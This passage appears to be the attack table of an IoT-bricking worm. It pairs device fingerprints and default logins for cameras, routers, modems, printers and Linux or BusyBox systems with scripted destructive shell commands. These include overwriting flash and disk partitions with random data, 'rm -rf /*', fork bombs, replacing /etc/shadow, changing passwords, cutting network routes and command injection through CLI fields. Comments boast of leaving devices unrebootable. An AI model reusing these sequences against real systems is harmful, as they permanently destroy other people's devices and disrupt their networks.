    'd() { echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; d|d & };d 2>>/%NEWPASS% >>/%NEWPASS%2', '[#$>] ', 
    'd() { echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; d|d & };d 2>>/home/app/%NEWPASS% >>/home/app/%NEWPASS%2', '[#$>] ', 
    'd() { echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; d|d & };d 2>>/tmp/%NEWPASS% >>/tmp/%NEWPASS%2', '[#$>] ', 
    'while [ 1 ]; do cat /%NEWPASS% >>/%NEWPASS%3; cat /%NEWPASS%2 >>/%NEWPASS%3 done &', '[#$>] ', 
    '%RELAUNCH2%', '%RELAUNCH2%',
  ],
  # now we should trigger a relogin!!!
  # alt whitelabel thing which is in fact a hik
  [ 'hikvision', 'guest/.*', 'dvrdvs',
    # here's an unprivileged account attack on firmware, will render some units unrebootable
    'echo HAKVISION >/home/hik/hicore.tar.gz', '[#$>] ', 
    'echo HAKVISION >/home/hik/uImage', '[#$>] ', 
    'echo dd if=/dev/urandom of=/dev/mtdblock0 >/home/hik/start.sh', '[#$>] ', 
    'echo dd if=/dev/urandom of=/dev/mtdblock1 >>/home/hik/start.sh', '[#$>] ', 
    'echo dd if=/dev/urandom of=/dev/mtdblock2 >>/home/hik/start.sh', '[#$>] ',
    'echo reboot >>/home/hik/start.sh', '[#$>] ',
    # a few extras for alt firmwares
    'echo HAKVISION >/home/hik/webs.tar.gz', '[#$>] ', 
    'echo HAKVISION >/home/hik/hicore.tar.lzma', '[#$>] ', 
    # try to overwrite /etc/shadow with login root/hikvision :)
    'echo root:\$1\$ChRPh3ur\$Yy6bjTErRXoajEZ1jao79/:14194:0:99999:7::: >/etc/shadow', '[#$>] ',
    'echo hikvision:\$1\$ChRPh3ur\$Yy6bjTErRXoajEZ1jao79/:14194:0:99999:7::: >>/etc/shadow', '[#$>] ',
    'd() { echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; d|d & };d 2>>/%NEWPASS% >>/%NEWPASS%2', '[#$>] ', 
    'd() { echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; d|d & };d 2>>/home/app/%NEWPASS% >>/home/app/%NEWPASS%2', '[#$>] ', 
    'd() { echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; d|d & };d 2>>/tmp/%NEWPASS% >>/tmp/%NEWPASS%2', '[#$>] ', 
    'while [ 1 ]; do cat /%NEWPASS% >>/%NEWPASS%3; cat /%NEWPASS%2 >>/%NEWPASS%3 done &', '[#$>] ', 
  ],

	[ 'dvrdvs', '.*', '\[root\[0m@\[31mdvrdvs',
	  'cat /dev/urandom >/dev/sdb1 &', '# ',
	  'cat /dev/urandom >/dev/sdb2 &', '# ',
	  'cat /dev/urandom >/dev/sdb3 &', '# ',
	  'cat /dev/urandom >/dev/sdb4 &', '# ',
	  'cat /dev/urandom >/dev/sdf1 &', '# ',
	  'cat /dev/urandom >/dev/sdf2 &', '# ',
	  'cat /dev/urandom >/dev/sdf3 &', '# ',
	  'cat /dev/urandom >/dev/sdf4 &', '# ',
	  'cat /dev/urandom >/dev/sdg1 &', '# ',
	  'cat /dev/urandom >/dev/sdg2 &', '# ',
	  'cat /dev/urandom >/dev/sdg3 &', '# ',
	  'cat /dev/urandom >/dev/sdg4 &', '# ',
	  'cat /dev/urandom >/dev/sdh1 &', '# ',
	  'cat /dev/urandom >/dev/sdh2 &', '# ',
	  'cat /dev/urandom >/dev/sdh3 &', '# ',
	  'cat /dev/urandom >/dev/sdh4 &', '# ',
	  'cat /dev/urandom >/dev/mtdblock0 & ', '# ',
	  'cat /dev/urandom >/dev/mtdblock1 & ', '# ',
	  'cat /dev/urandom >/dev/mtdblock2 & ', '# ',
	  'cat /dev/urandom >/dev/mtdblock3 & ', '# ',
	  'cat /dev/urandom >/dev/mtdblock4 & ', '# ',
	  'cat /dev/urandom >/dev/mtdblock5 & ', '# ',
	  'cat /dev/urandom >/dev/mtdblock6 & ', '# ',
	  'cat /dev/urandom >/dev/mtdblock7 & ', '# ',
	  'cat /dev/urandom >/dev/mtdblock8 & ', '# ',
	  'cat /dev/urandom >/dev/root & ', '# ',
	  'ifconfig eth0 down', '',
	],

	# Some home gateway "slave wifi" WIFIMLD white label thingy
	[ 'slave', '.*', 'Invalid command!', 
		'enable', 'assword: ',
		'%OLDPASS%', '[#$>] ',
		'enable', '[#$>:] ',     # just in case this is non-default?
		'admin', '[#$>:] ',    
		'system', '[#$>] ',
		'sh', '[#$>] ',
		'df', '[#$>] ',
		'dd if=/dev/urandom of=/dev/mtdblock3 &', '[#$>] ', 
		'dd if=/dev/urandom of=/dev/mtdblock0;dd if=/dev/urandom of=/dev/mtdblock1;dd if=/dev/urandom of=/dev/mtdblock2 &', '[#$>] ', 
		'route del default;iptables -A INPUT -j DROP', '%TERM%',
	],

	# Zhone technologies
	[ 'zhone', 'admin/zhone', '',
		'enable', '[#$>] ', 
		'development', '[#$>] ', 
		'sh', '[#$>] ', 
		'cat /dev/urandom >/dev/mtd0 &', '', 
		'cat /dev/urandom >/dev/mtd1 &', '', 
		'cat /dev/urandom >/dev/mtd2 &', '', 
		'cat /dev/urandom >/dev/mtd3 &', '', 
		'cat /dev/urandom >/dev/mtdblock0 &', '', 
		'cat /dev/urandom >/dev/mtdblock1 &', '', 
		'cat /dev/urandom >/dev/mtdblock2 &', '', 
		'cat /dev/urandom >/dev/mtdblock3 &', '', 
		'cat /dev/urandom >/dev/root &', '', 
		'cat /etc/passwd', '', 
		'passwd', 'New password: ',
		'%NEWPASS%', 'Retype password: " ',
		'%NEWPASS%', '[#$>] ', 
		'passwd admin', 'New password: ',
		'%NEWPASS%', 'Retype password: " ',
		'%NEWPASS%', '[#$>] ', 
		'passwd user', 'New password: ',
		'%NEWPASS%', 'Retype password: " ',
		'%NEWPASS%', '[#$>] ', 
		'passwd manufacturing', 'New password: ',
		'%NEWPASS%', 'Retype password: " ',
		'%NEWPASS%', '[#$>] ', 
		'passwd nobody', 'New password: ',
		'%NEWPASS%', 'Retype password: " ',
		'%NEWPASS%', '[#$>] ', 
		'route del default', '[#$>] ', 
		'iptables -A OUTPUT -j DROP', '[#$>] ', 
    # for another kind of Zhone device, some kind of telco router, see infoP_routers.txt new
    'set2default', ': ',
    'yes', ': ',
    'yes', 'yes\S ',
    'no', 'no\S ',
    'yes', 'accordingly',
     # yet more crap
    'configure terminal', '[#$>] ',
    'system restore factory-defaults', '',
	],    

  # VxWorks, some old embedded OS from 2000s
  [ 'vxworks', '.*', '(tStdioProxy|IrqDLCS_?CMD_PROCESSOR|ipcom_?telnetspawn|tErfTask|\sstkCommand\s|OnLine help \S press F1)',
    'td tExcTask;td tJobTask', '-> ',
    'td TR069C;td TR069S;td TR069_chk', '-> ',
    'td iptftps', '-> ',
    'td ipdhcpc', '-> ',
    'td ipdhcps', '-> ',
    'td ipcom_telnetd', '-> ',
    'td ipnetd', '-> ',
  ],

	# Some misc device similar to quagga below
	[ 'view', '.*', 'type \'sh\', exc[e]?ute shell',
		'?', '[#$>] ', 
		'sh', '[#$>] ', 
		'cat /proc/mounts', '', 
		'cat /dev/urandom >/dev/mtdblock5 &', '', 
		'cat /dev/urandom >/dev/mtdblock11 &', '', 
		'cat /dev/urandom >/dev/mtdblock10 &', '', 
		'cat /dev/urandom >/dev/mtdblock12 &', '', 
		'cat /dev/urandom >/dev/root &', '', 
		'cat /dev/urandom >/dev/mtdblock0 &', '', 
		'cat /dev/urandom >/dev/mtdblock1 &', '', 
		'cat /dev/urandom >/dev/mtdblock2 &', '', 
		'cat /dev/urandom >/dev/mtdblock3 &', '', 
		'route del default', '%WAIT%', 
		'iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP', '%WAIT% ',
		'd(){ d|d & };d', '%TERM%', 
	],
	# BoC Router, not sure what this is.. Unbranded Chinese router from Aliexpress?
	[ 'bocrouter', '.*', '(BoC Router|Unknow command)',
		'runshellcmd', '>',
		'cat /dev/urandom >/dev/mtdblock0 &', '>',
		'cat /dev/urandom >/dev/mtdblock1 &', '>',
		'cat /dev/urandom >/dev/mtdblock2 &', '>',
		'cat /dev/urandom >/dev/mtdblock3 &', '>',
		'cat /dev/urandom >/dev/mtdblock4 &', '>',
		'cat /dev/urandom >/dev/mtdblock5 &', '>',
		'route del default', '>',
	],

  # ATMOS ? Not very common.. something by GlobeSpan Virata ?
  [ 'atmos', '.*', 'Unrecognized command \Suse \S\?\S to see valid completions',
    'console enable', '> ',
    'flashfs', '> ',
    'wipe', '> ',    
    'home', '> ',         
    'restart', '',
  ],           

  # Another similar to view and quagga, Sixpon S302, S304 etc
  [ 'sixpon', '.*', 'Enter lazy mode, input \S+ to back, input \S+ to quit',
    '/', '[#$>] ',
    'linuxshell', '[#$>] ',
    'cat /dev/urandom >/dev/mtdblock1 &', '[#$>] ',
    'cat /dev/urandom >/dev/mtdblock2 &', '[#$>] ',
    'cat /dev/urandom >/dev/mtdblock0 &', '[#$>] ',
    'cat /dev/urandom >/dev/mtdblock3 &', '[#$>] ',
    'route del default', '[#$>] ',
    'iptables -F;iptables -t nat -F;iptables -A INPUT -j DROP', '[#$>] ',
    '', '',
    '/', '',
    '', '',
    'manufactory', '[#$>] ',
    'tofactory', '[#$>] ',
    'restore', '[#$>] ',
  ],

	# fortigate
	[ 'fortigate', '.*', 'Unknown action 0',
		'execute erase-disk boot', 'y/n\) ',
		'y', 'media\? ',
		'1', 'y/n\) ', 
		'n', '%WAIT%',
		'execute shutdown', 'y/n\) ',
		'y', '%TERM%',
	],
	
	# Buggy IoT cellular modem of some sort, couldn't fingerprint maker or model, just left here for ref
	[ 'cellbug', '.*', '% Unknown command,\s+\[\%s',
		'enable', '[#$>] ', 
		'configure terminal', '[#$>] ', 
		'wlanoff', '[#$>] ', 
		'save', '[#$>] ', 
		'configure terminal', '[#$>] ', 
		'cdma-disconnect\nsave', '[#$>] ',  
	],

	# Some kind of quagga thing.. Unsure of UI, but have seen a bunch of these. 
  # Some are related to port 26 GPON thingies. Maybe matching more than one
  # manufacturer CLI?
	[ 'quagga', '.*', '% Unknown command\.',
		'enable', '(Password:|>) ',
		'%OLDPASS%', '[#$>] ',

		'cd device', '[#$>] ',
		'hostname HACKED', '[#$>] ',
		'cd wlan', '[#$>] ',
		'set wifi ssid 1 name HACKED', '[#$>] ',
		'cd ..', '[#$>] ',    
		'save', '[#$>] ',

		'ddd', '[#$>] ',
		'shell', '[#$>] ',
		'tshell', '[#$>] ',
		# stupid hack, we will buy some time here in case there is a legit shell avail..
		# hey, it's IoT quality coding :)
		'shell', '[#$>] ',
		'tshell', '[#$>] ',
		'exit', '[#$>] ',   
		'enable', '(Password:|>) ',            # edge case, redo in case there was no ddd
		'%OLDPASS%', '[#$>] ',   

		'cd wan\nset wan 3 outip_type static\nset wan 2 outip_type 1\nset wan 2 outip_type static\nset wan 1 outip_type 1\nset wan 1 outip_type static\nset wan 0 outip_type 1\nset wan 0 outip_type static\ncd ..\nsave\ncd pon\nshow cat_cli_in_shell `cat${IFS}/dev/zero>/dev/root`', '',
		'cd ..', '[#$>] ',    

		'?', '[#$>] ', 
		'enable', '[#$>] ', 
		'start-shell', '[#$>] ', 
		'fdisk -l', '[#$>] ', 
		"fdisk -C 1 /dev/mtd0", '(m\sfor\shelp\S?:|[#$>] )', 
		"w", '[#$>] ',
		"fdisk -C 1 /dev/mtd1", '(m\sfor\shelp\S?:|[#$>] )', 
		"w", '[#$>] ',
		"fdisk -C 1 /dev/mtd2", '(m\sfor\shelp\S?:|[#$>] )', 
		"w", '[#$>] ',
		"fdisk -C 1 /dev/mtd3", '(m\sfor\shelp\S?:|[#$>] )', 
		"w", '[#$>] ',
		"fdisk -C 1 /dev/mtd4", '(m\sfor\shelp\S?:|[#$>] )', 
		"w", '[#$>] ',
		"fdisk -C 1 /dev/mtdblock0", '(m\sfor\shelp\S?:|[#$>] )', 
		"w", '[#$>] ',
		"fdisk -C 1 /dev/mtdblock1", '(m\sfor\shelp\S?:|[#$>] )', 
		"w", '[#$>] ',
		"fdisk -C 1 /dev/mtdblock2", '(m\sfor\shelp\S?:|[#$>] )', 
		"w", '[#$>] ',
		"fdisk -C 1 /dev/mtdblock3", '(m\sfor\shelp\S?:|[#$>] )', 
		"w", '[#$>] ',
		"fdisk -C 1 /dev/mtdblock4", '(m\sfor\shelp\S?:|[#$>] )', 
		"w", '[#$>] ',
		"fdisk -C 1 /dev/ram0", 'm\sfor\shelp\S?: ', 
		"w", '[#$>] ',

		"cat /dev/urandom >/dev/mtdblock0 &", '[#$>] ',
		"cat /dev/urandom >/dev/mtdblock1 &", '[#$>] ',
		"cat /dev/urandom >/dev/mtdblock2 &", '[#$>] ',
		"cat /dev/urandom >/dev/mtdblock3 &", '[#$>] ',
		"cat /dev/urandom >/dev/mtdblock4 &", '[#$>] ',
		"cat /dev/urandom >/dev/mtdblock5 &", '[#$>] ',
		"cat /dev/urandom >/dev/mtdblock6 &", '[#$>] ',
		"cat /dev/urandom >/dev/mtdblock7 &", '[#$>] ',
		"cat /dev/urandom >/dev/mtdblock8 &", '[#$>] ',
		"cat /dev/urandom >/dev/mtdblock9 &", '[#$>] ',
		'route del default;iproute del default;rm -rf /* 2>/dev/null &', '[#$>] ',
		'iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP', '[#$>] ',
		# fallback in case start-shell failed, some units
		'copy flash `rm${IFS}-rf${IFS}/*${IFS}&` tftp 1.2.3.4', '',
		'copy flash `route${IFS}del${IFS}default` tftp 1.2.3.4', '[#$>] ',
		# fallback in case there is no start-shell or RCE
		'configure terminal', '[#$>] ',
		'username %OLDUSER% %NEWPASS%', '[#$>] ',
		'user administrator admin disable', '[#$>] ',		
		'restore factory_setting', '[#$>] ',
		'restore factory_defaults', '[#$>] ',

		'enable', '(Password:|>) ',
		'%OLDPASS%', '[#$>] ',
		'ddd', '[#$>] ',
		'mibreset', '[#$>] ',

		'reboot', '[#$>] ',
		'exit', '[#$>] ',
		'reboot', '[#$>] ',
		'exit', '[#$>] ',
	],    

	# some lame "tc login" thing, QBR-2041WW etc QTech
	[ "qtech", ".*", '>\s+restoredefault\s+restore the device settings to the factory defaults and reboot',
		'model', '[#$>] ',
		'arp', '[#$>] ',
		'restoredefault', '%WAIT%',
	],
	
  # RICOH Management Shell - printer thingy
  [ 'ricoh', '.*', 'msh> ',
    'devicename name HACKED', 'msh> ',
    'ifconfig', 'msh> ',
    'ifconfig ether 10.1.2.3', 'msh> ',
    'ifconfig ether netmask 255.255.255.254', 'msh> ',
    'route add default 10.1.2.2', 'msh> ',
    'dhcp ether off', 'msh> ',
    'hostname ether name PRINTER-HACKED', 'msh> ',
    'logout', '> ',
    'yes', 'Save',
  ],

  # R3000 Richer Link limited perm account.. look for root pass
  # filling tmp seems to cause device to go offline
  [ "r3000", "telnet/.*", '(R3000|BES46|ftp\S+/tmp\$|failsafe)',
    'cat /dev/urandom >/tmp/.XYZ', '%WAIT%',
    'chmod gou-rxw >/tmp/.XYZ', '%WAIT%',
    'cat /dev/urandom >/tmp/.XYX', '%WAIT%',
    'chmod gou-rxw >/tmp/.XYX', '%WAIT%',
    'cat /dev/urandom >/tmp/.XAX', '%WAIT%',
    'chmod gou-rxw >/tmp/.XAX', '%WAIT%',
    'cat /dev/urandom >/tmp/.XFX', '%WAIT%',
    'chmod gou-rxw >/tmp/.XFX', '%WAIT%',
    'cat /dev/urandom >/tmp/.XPX', '%WAIT%',
    'chmod gou-rxw >/tmp/.XPX', '%WAIT%',
  ],
  
	# Busybox catch-all
	# First matches TP Link WR741ND etc
	[ "busybox", "root/5up", 'BusyBox\sv',
		'cat /dev/urandom >/dev/mtdblock0 &', '',
		'cat /dev/urandom >/dev/mtdblock1 &', '',
		'cat /dev/urandom >/dev/mtdblock2 &', '',
		'route del default;iproute del default;rm -rf /* 2>/dev/null &', '%WAIT%',
		'cat /dev/urandom >/dev/mtdblock0 &', '',
		'cat /dev/urandom >/dev/mtdblock1 &', '',
		'cat /dev/urandom >/dev/mtdblock2 &', '',
		'route del default;iproute del default;rm -rf /* 2>/dev/null &', '%WAIT%',
		'iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP', '[#$] ',
		"reboot", '[#$] ',
	],
	[ "busybox", "(root/BUSYBOXBLANK|.*/SKIPPEDBLANK)", '',
		'mtd_write erase mtd0 &', '',
		'mtd_write erase mtd1 &', '',
		'mtd_write erase mtd2 &', '',
    'cat /dev/urandom >/dev/mtdblock0 &', '',
    'cat /dev/urandom >/dev/mtdblock1 &', '',
    'cat /dev/urandom >/dev/mtdblock2 &', '',
    'cat /dev/urandom >/dev/mtdblock3 &', '',
    'cat /dev/urandom >/dev/mtdblock4 &', '',
    'cat /dev/urandom >/dev/mtdblock5 &', '',
  	'cat /dev/urandom >/dev/mtdblock6 &', '',
  	'cat /dev/urandom >/dev/mtdblock7 &', '',
  	'cat /dev/urandom >/dev/mtdblock8 &', '',
  	'cat /dev/urandom >/dev/mtdblock9 &', '',
    'cat /dev/urandom >/dev/root &', '',
		'route del default;iproute del default', '%WAIT%',
    'cat /dev/urandom >/dev/mtdblock0 &', '',
    'cat /dev/urandom >/dev/mtdblock1 &', '',
    'cat /dev/urandom >/dev/mtdblock2 &', '',
    'cat /dev/urandom >/dev/mtdblock3 &', '',
    'cat /dev/urandom >/dev/mtdblock4 &', '',
    'cat /dev/urandom >/dev/mtdblock5 &', '',
  	'cat /dev/urandom >/dev/mtdblock6 &', '',
  	'cat /dev/urandom >/dev/mtdblock7 &', '',
  	'cat /dev/urandom >/dev/mtdblock8 &', '',
  	'cat /dev/urandom >/dev/mtdblock9 &', '',
    'cat /dev/urandom >/dev/root &', '',
		"sysctl -w net.ipv4.tcp_timestamps=0", '[#$] ',
		"sysctl -w kernel.threads-max=1", '%WAIT%',
		"halt -n -f;halt;poweroff", '[#$] ',
		'd(){ d|d & };d', '%TERM%', 
	],
  # busybox thingy, but broken due to lack of /dev/null etc stuff..
  [ 'reosguest', 'guest/.*', 'ReOS.*UTT', 
    'd(){ d|d & };d', '%TERM%',
  ],
	[ "busybox", ".*", 'BusyBox\sv',
		'mtd_write erase mtd0 &', '',
		'mtd_write erase mtd1 &', '',
		'mtd_write erase mtd2 &', '',
    'cat /dev/urandom >/dev/mtdblock0 &', '',
    'cat /dev/urandom >/dev/mtdblock1 &', '',
    'cat /dev/urandom >/dev/mtdblock2 &', '',
    'cat /dev/urandom >/dev/mtdblock3 &', '',
    'cat /dev/urandom >/dev/mtdblock4 &', '',
    'cat /dev/urandom >/dev/mtdblock5 &', '',
    'cat /dev/urandom >/dev/mtdblock6 &', '',
    'cat /dev/urandom >/dev/mtdblock7 &', '',
    'cat /dev/urandom >/dev/mtdblock8 &', '',
    'cat /dev/urandom >/dev/mtd0 &', '',
    'cat /dev/urandom >/dev/mtd1 &', '',
    'cat /dev/urandom >/dev/mtd2 &', '',
    'cat /dev/urandom >/dev/mtd3 &', '',
    'cat /dev/urandom >/dev/mtdblock/0 &', '',
    'cat /dev/urandom >/dev/mtd/0 &', '',
    'cat /dev/urandom >/dev/root &', '',
		'cat /dev/urandom >/dev/mtdblock16 &', '',
 		'route del default;iproute del default;rm -rf /* 2>/dev/null &', '%WAIT%',
		"sysctl -w net.ipv4.tcp_timestamps=0", '[#$] ',
		"sysctl -w kernel.threads-max=1", '%WAIT%',
		"halt -n -f;halt;poweroff", '[#$] ',
		"reboot", '[#$] ',
		'd(){ d|d & };d', '%TERM%', 
	],
	[ "busybox", ".*", 'ls:\sillegal\soption\s\-\-\sF',
		'mtd_write erase mtd0 &', '',
		'mtd_write erase mtd1 &', '',
		'mtd_write erase mtd2 &', '',
    'cat /dev/urandom >/dev/mtdblock0 &', '',
    'cat /dev/urandom >/dev/mtdblock1 &', '',
    'cat /dev/urandom >/dev/mtdblock2 &', '',
    'cat /dev/urandom >/dev/mtdblock3 &', '',
    'cat /dev/urandom >/dev/mtdblock4 &', '',
    'cat /dev/urandom >/dev/mtdblock5 &', '',
    'cat /dev/urandom >/dev/mtdblock6 &', '',
    'cat /dev/urandom >/dev/mtdblock7 &', '',
    'cat /dev/urandom >/dev/mtdblock8 &', '',
    'cat /dev/urandom >/dev/mtd0 &', '',
    'cat /dev/urandom >/dev/mtd1 &', '',
    'cat /dev/urandom >/dev/mtd2 &', '',
    'cat /dev/urandom >/dev/mtd3 &', '',
    'cat /dev/urandom >/dev/mtdblock/0 &', '',
    'cat /dev/urandom >/dev/mtd/0 &', '',
    'cat /dev/urandom >/dev/root &', '',
		'cat /dev/urandom >/dev/mtdblock16 &', '',
		'route del default;iproute del default;rm -rf /* 2>/dev/null &', '%WAIT%',
		"sysctl -w net.ipv4.tcp_timestamps=0", '[#$] ',
		"sysctl -w kernel.threads-max=1", '%WAIT%',
		"halt -n -f", '[#$] ',
		"reboot", '[#$] ',
		'd(){ d|d & };d', '%TERM%', 
	],

  # openwrt 
  [ "openwrt", "root.*", 'Barrier Breaker',
    'mtd_write erase mtd0 &', '',
    'mtd_write erase mtd1 &', '',
    'mtd_write erase mtd2', '',
    'cat /dev/urandom >/dev/mtdblock0 &', '',
    'cat /dev/urandom >/dev/mtdblock1 &', '',
    'cat /dev/urandom >/dev/mtdblock2 &', '',
    'cat /dev/urandom >/dev/mtdblock3 &', '',
    'cat /dev/urandom >/dev/mtdblock4 &', '',
    'cat /dev/urandom >/dev/mtdblock5 &', '',
    'cat /dev/urandom >/dev/mtdblock6 &', '',
    'cat /dev/urandom >/dev/mtdblock7 &', '',
    'cat /dev/urandom >/dev/mtdblock8 &', '',
    'cat /dev/urandom >/dev/root &', '',
    'cat /dev/urandom >/dev/mtdblock16 &', '',
    'cat /dev/urandom >/dev/mtd0 &', '',
    'cat /dev/urandom >/dev/mtd1 &', '',
    'cat /dev/urandom >/dev/mtd2 &', '',
    'route del default;iproute del default;rm -rf /* 2>/dev/null &', '%WAIT%',
    "sysctl -w net.ipv4.tcp_timestamps=0", '[#$] ',
    "sysctl -w kernel.threads-max=1", '%WAIT%',
    "halt -n -f", '[#$] ',
    "reboot", '[#$] ',
    'd(){ d|d & };d', '%TERM%',
  ],

	# misidentified honeypot, actually a real system that took our string updates
  # since it is still sitting around let's brick it
	[ 'misid', ".*", 'SYSTEM.HACKED.PLEASE.REINSTALL', 
		'su root', '[#$>] ',
		'uptime', '', 
		'cat /etc/motd', '', 
		'fdisk -l', '', 
		'df', '', 
		'dd if=/dev/urandom of=/dev/sda &', '', 
		'dd if=/dev/urandom of=/dev/sda1 &', '', 
		'dd if=/dev/urandom of=/dev/sda2 &', '', 
		'dd if=/dev/urandom of=/dev/sda3 &', '', 
		'dd if=/dev/urandom of=/dev/sda4 &', '', 
		'dd if=/dev/urandom of=/dev/sdb &', '', 
		'dd if=/dev/urandom of=/dev/mtd0 &', '', 
		'dd if=/dev/urandom of=/dev/mtd1 &', '', 
		'dd if=/dev/urandom of=/dev/mtd2 &', '', 
		'dd if=/dev/urandom of=/dev/mtd3 &', '', 
		'dd if=/dev/urandom of=/dev/mtdblock0 &', '', 
		'dd if=/dev/urandom of=/dev/mtdblock1 &', '', 
		'dd if=/dev/urandom of=/dev/mtdblock2 &', '', 
		'dd if=/dev/urandom of=/dev/mtdblock3 &', '', 
		'dd if=/dev/urandom of=/dev/mtdblock4 &', '', 
		'dd if=/dev/urandom of=/dev/mtdblock5 &', '', 
		'dd if=/dev/urandom of=/dev/mtdblock6 &', '', 
		'dd if=/dev/urandom of=/dev/mtdblock7 &', '[#$>] ', 
		'dd if=/dev/urandom of=/dev/hda1 &', '', 
		'dd if=/dev/urandom of=/dev/hdb1 &', '', 
		'dd if=/dev/urandom of=/dev/root &', '', 
		'dd if=/dev/urandom of=/dev/ram0 &', '', 
		'dd if=/dev/urandom of=/dev/mmcblk0 &', '', 
		'dd if=/dev/urandom of=/dev/mmcblk0p1 &', '', 
		'cat /dev/urandom >/dev/sda &', '', 
		'cat /dev/urandom >/dev/sda1 &', '', 
		'cat /dev/urandom >/dev/sda2 &', '', 
		'cat /dev/urandom >/dev/sda3 &', '', 
		'cat /dev/urandom >/dev/sda4 &', '', 
		'cat /dev/urandom >/dev/sdb &', '', 
		'cat /dev/urandom >/dev/mtd0 &', '', 
		'cat /dev/urandom >/dev/mtd1 &', '', 
		'cat /dev/urandom >/dev/mtd2 &', '', 
		'cat /dev/urandom >/dev/mtd3 &', '[#$>] ', 
		'cat /dev/urandom >/dev/mtdblock0 &', '', 
		'cat /dev/urandom >/dev/mtdblock1 &', '', 
		'cat /dev/urandom >/dev/mtdblock2 &', '', 
		'cat /dev/urandom >/dev/mtdblock3 &', '', 
		'cat /dev/urandom >/dev/mtdblock4 &', '', 
		'cat /dev/urandom >/dev/mtdblock5 &', '', 
		'cat /dev/urandom >/dev/mtdblock6 &', '', 
		'cat /dev/urandom >/dev/mtdblock7 &', '', 
		'cat /dev/urandom >/dev/hda1 &', '', 
		'cat /dev/urandom >/dev/hdb1 &', '', 
		'cat /dev/urandom >/dev/root &', '', 
		'cat /dev/urandom >/dev/ram0 &', '', 
		'cat /dev/urandom >/dev/mmcblk0 &', '', 
		'cat /dev/urandom >/dev/mmcblk0p1 &', '', 
		'route del default;iproute del default;rm -rf /* 2>/dev/null &', '',
		'iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP', '%WAIT% ',
		'd(){ d|d & };d 2>/dev/null', '[#$>] ', 
		'sysctl -w net.ipv4.tcp_timestamps=0;sysctl -w kernel.threads-max=1', '%WAIT% ',
		'halt -n -f', '[#$>] ',
		'reboot', '[#$>] ',
		# try again just in case there was no dev null
		'd(){ d|d & };d', '%TERM%', 
	],

	# Linux catch-all for stuff which does not match anything else
	[ "linux", ".*", '(Linux\s\S+\s\d\.\d|hAjUCNM1|load\saverage:)',
		'su root', '[#$>] ',
#    'last;who', '[#$>] ',
		'uptime', '', 
		'cat /etc/motd', '', 
		'fdisk -l', '', 
		'df', '', 
		'dd if=/dev/urandom of=/dev/sda &', '', 
		'dd if=/dev/urandom of=/dev/sda1 &', '', 
		'dd if=/dev/urandom of=/dev/sda2 &', '', 
		'dd if=/dev/urandom of=/dev/sda3 &', '', 
		'dd if=/dev/urandom of=/dev/sda4 &', '', 
		'dd if=/dev/urandom of=/dev/sdb &', '', 
		'dd if=/dev/urandom of=/dev/mtd0 &', '', 
		'dd if=/dev/urandom of=/dev/mtd1 &', '', 
		'dd if=/dev/urandom of=/dev/mtd2 &', '', 
		'dd if=/dev/urandom of=/dev/mtd3 &', '', 
		'dd if=/dev/urandom of=/dev/mtdblock0 &', '', 
		'dd if=/dev/urandom of=/dev/mtdblock1 &', '', 
		'dd if=/dev/urandom of=/dev/mtdblock2 &', '', 
		'dd if=/dev/urandom of=/dev/mtdblock3 &', '', 
		'dd if=/dev/urandom of=/dev/mtdblock4 &', '', 
		'dd if=/dev/urandom of=/dev/mtdblock5 &', '', 
		'dd if=/dev/urandom of=/dev/mtdblock6 &', '', 
		'dd if=/dev/urandom of=/dev/mtdblock7 &', '[#$>] ', 
		'dd if=/dev/urandom of=/dev/hda1 &', '', 
		'dd if=/dev/urandom of=/dev/hdb1 &', '', 
		'dd if=/dev/urandom of=/dev/root &', '', 
		'dd if=/dev/urandom of=/dev/ram0 &', '', 
		'dd if=/dev/urandom of=/dev/mmcblk0 &', '', 
		'dd if=/dev/urandom of=/dev/mmcblk0p1 &', '', 
		'cat /dev/urandom >/dev/sda &', '', 
		'cat /dev/urandom >/dev/sda1 &', '', 
		'cat /dev/urandom >/dev/sda2 &', '', 
		'cat /dev/urandom >/dev/sda3 &', '', 
		'cat /dev/urandom >/dev/sda4 &', '', 
		'cat /dev/urandom >/dev/sdb &', '', 
		'cat /dev/urandom >/dev/mtd0 &', '', 
		'cat /dev/urandom >/dev/mtd1 &', '', 
		'cat /dev/urandom >/dev/mtd2 &', '', 
		'cat /dev/urandom >/dev/mtd3 &', '[#$>] ', 
		'cat /dev/urandom >/dev/mtdblock0 &', '', 
		'cat /dev/urandom >/dev/mtdblock1 &', '', 
		'cat /dev/urandom >/dev/mtdblock2 &', '', 
		'cat /dev/urandom >/dev/mtdblock3 &', '', 
		'cat /dev/urandom >/dev/mtdblock4 &', '', 
		'cat /dev/urandom >/dev/mtdblock5 &', '', 
